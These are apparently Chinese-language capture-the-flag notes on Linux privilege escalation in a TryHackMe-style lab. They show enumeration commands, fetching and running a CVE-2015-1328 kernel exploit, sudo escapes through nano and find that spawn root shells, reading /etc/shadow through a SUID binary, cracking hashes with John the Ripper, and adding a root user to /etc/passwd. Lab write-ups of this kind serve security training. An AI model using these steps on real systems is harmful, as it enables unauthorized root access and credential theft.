## task3

1. `hostname` 命令將返回目標機器的主機名。   
2. `unname -a` 打印系統信息，為我們提供有關係統使用的內核的更多詳細信息。這在搜索可能導致權限提升的任何潛在內核漏洞時非常有用。   

3. `/proc/version`可能會為您提供有關內核版本和其他數據的信息                       
4. `/etc/issue` 該文件通常包含有關操作系統的一些信息，但可以輕鬆定製或更改               
5. `ps`                 
6. `env` 命令將顯示環境變量。            
7. `sudo -l` 命令可用於列出您的用戶可以使用運行的所有命令sudo。              
8. `id` 命令將提供用戶權限級別和組成員身份的一般概述。          
9. /etc/passwd     
10. history 命令可以讓我們對目標系統有所了解，並且雖然很少，但已經存儲了密碼或用戶名等信息     
11. ip route 命令來確認，以查看存在哪些網絡路由。
12. netstat
13. `find`
```
find . -name flag1.txt: 在當前目錄中找到名為“flag1.txt”的文件
find /home -name flag1.txt: 在 /home 目錄中找到文件名“flag1.txt”
find / -type d -name config: 在“/”下找到名為config的目錄
find / -type f -perm 0777：查找具有777權限的文件（所有用戶可讀、可寫和可執行的文件）
find / -perm a=x: 查找可執行文件
find /home -user frank: 在“/home”下查找用戶“frank”的所有文件
find / -mtime 10: 查找最近 10 天內修改過的文件
find / -atime 10: 查找過去 10 天內訪問過的文件
find / -cmin -60: 查找在過去一小時（60 分鐘）內更改的文件
find / -amin -60: 查找最近一小時（60 分鐘）內的文件訪問
find / -size 50M: 查找大小為 50 MB 的文件
```
```
$ hostname
wade7363
$ uname -a
Linux wade7363 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
$ cat /proc/version
Linux version 3.13.0-24-generic (buildd@panlong) (gcc version 4.8.2 (Ubuntu 4.8.2-19ubuntu1) ) #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014
$ cat /etc/issue
Ubuntu 14.04 LTS \n \l

$ python -version
Unknown option: -e
usage: python [option] ... [-c cmd | -m mod | file | -] [arg] ...
Try `python -h' for more information.
$ python --version
Python 2.7.6

```
## task5 權限提升：內核利用
CVE：2015-1328
```
┌──(root💀kali)-[/home/kali/Downloads]
└─# gcc 37292.c -o 37292

┌──(root💀kali)-[/home/kali/Downloads]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.77.114 - - [27/Jan/2022 07:27:36] "GET /37292 HTTP/1.1" 200 -

```


ubuntu
```
cd tmp

wget 

./37292

```

## task6 權限提升：sudo

https://gtfobins.github.io/

用戶“karen”可以在目標系統上以 sudo 權限運行多少程序？
```
$ sudo -l
Matching Defaults entries for karen on ip-10-10-232-36:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User karen may run the following commands on ip-10-10-232-36:
    (ALL) NOPASSWD: /usr/bin/find
    (ALL) NOPASSWD: /usr/bin/less
    (ALL) NOPASSWD: /usr/bin/nano

```
提升權限
```
sudo nano
^R^X
reset; sh 1>&0 2>&0
```

or
```
sudo find . -exec /bin/sh \; -quit
```

## task7 權限提升：SUID

find / -type f -perm -04000 -ls 2>/dev/null將列出設置了 SUID 或 SGID 位的文件。  
-----------------------------------------------------------------------------------
可以使用 unshadow 工具創建一個可以被開膛手約翰破解的文件。為了實現這一點，unshadow 需要/etc/shadow和/etc/passwd文件。    

`unshadow passwd.txt shadow.txt > passwords.txt`    
john --wordlist=/usr/share/wordlists passwords.txt    
-----------------------------------------------------------------------------------
### 另一種選擇是添加一個具有 root 權限的新用戶。這將幫助我們避開繁瑣的密碼破解過程。
可以使用 Kali Linux 上的 openssl 工具快速完成。
`openssl passwd -1 -salt THM password1`    
然後，我們將此密碼和用戶名添加到/etc/passwd 文件中。                        
一旦我們的用戶被添加（請注意如何root:/bin/bash用於提供一個 root                    shell），我們將需要切換到這個用戶並且希望應該有 root 權限。       
 
 shadow => shadow.txt
```
karen@ip-10-10-85-246:/$ base64 /etc/shadow | base64 --decode
root:*:18561:0:99999:7:::
daemon:*:18561:0:99999:7:::
bin:*:18561:0:99999:7:::
sys:*:18561:0:99999:7:::
sync:*:18561:0:99999:7:::
games:*:18561:0:99999:7:::
man:*:18561:0:99999:7:::
lp:*:18561:0:99999:7:::
mail:*:18561:0:99999:7:::
news:*:18561:0:99999:7:::
uucp:*:18561:0:99999:7:::
proxy:*:18561:0:99999:7:::
www-data:*:18561:0:99999:7:::
backup:*:18561:0:99999:7:::
list:*:18561:0:99999:7:::
irc:*:18561:0:99999:7:::
gnats:*:18561:0:99999:7:::
nobody:*:18561:0:99999:7:::
systemd-network:*:18561:0:99999:7:::
systemd-resolve:*:18561:0:99999:7:::
systemd-timesync:*:18561:0:99999:7:::
messagebus:*:18561:0:99999:7:::
syslog:*:18561:0:99999:7:::
_apt:*:18561:0:99999:7:::
tss:*:18561:0:99999:7:::
uuidd:*:18561:0:99999:7:::
tcpdump:*:18561:0:99999:7:::
sshd:*:18561:0:99999:7:::
landscape:*:18561:0:99999:7:::
pollinate:*:18561:0:99999:7:::
ec2-instance-connect:!:18561:0:99999:7:::
systemd-coredump:!!:18796::::::
ubuntu:!:18796:0:99999:7:::
gerryconway:$6$vgzgxM3ybTlB.wkV$48YDY7qQnp4purOJ19mxfMOwKt.H2LaWKPu0zKlWKaUMG1N7weVzqobp65RxlMIZ/NirxeZdOJMEOp3ofE.RT/:18796:0:99999:7:::
user2:$6$m6VmzKTbzCD/.I10$cKOvZZ8/rsYwHd.pE099ZRwM686p/Ep13h7pFMBCG4t7IukRqc/fXlA1gHXh9F2CbwmD4Epi1Wgh.Cl.VV1mb/:18796:0:99999:7:::
lxd:!:18796::::::
karen:$6$VjcrKz/6S8rhV4I7$yboTb0MExqpMXW0hjEJgqLWs/jGPJA7N/fEoPMuYLY1w16FwL7ECCbQWJqYLGpy.Zscna9GILCSaNLJdBP1p8/:18796:0:99999:7:::

```

passwd => passwd.txt
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
ec2-instance-connect:x:112:65534::/nonexistent:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
gerryconway:x:1001:1001::/home/gerryconway:/bin/sh
user2:x:1002:1002::/home/user2:/bin/sh
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
karen:x:1003:1003::/home/karen:/bin/sh

```
`unshadow passwd.txt shadow.txt >pass.txt`

### john
```
┌──(kali㉿kali)-[~/Desktop]
└─$ john pass.txt --wordlist=/usr/share/wordlists/rockyou.txt 
Warning: detected hash type "sha512crypt", but the string is also recognized as "HMAC-SHA256"
Use the "--format=HMAC-SHA256" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Password1        (karen)     
Password1        (user2)     
test123          (gerryconway)     
3g 0:00:00:09 DONE (2022-01-27 08:52) 0.3184g/s 1902p/s 2663c/s 2663C/s paramedic..biscuit1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```
### flag3
```
karen@ip-10-10-85-246:/home/ubuntu$ base64 /home/ubuntu/flag3.txt | base64 --decodeTHM-3847834

```
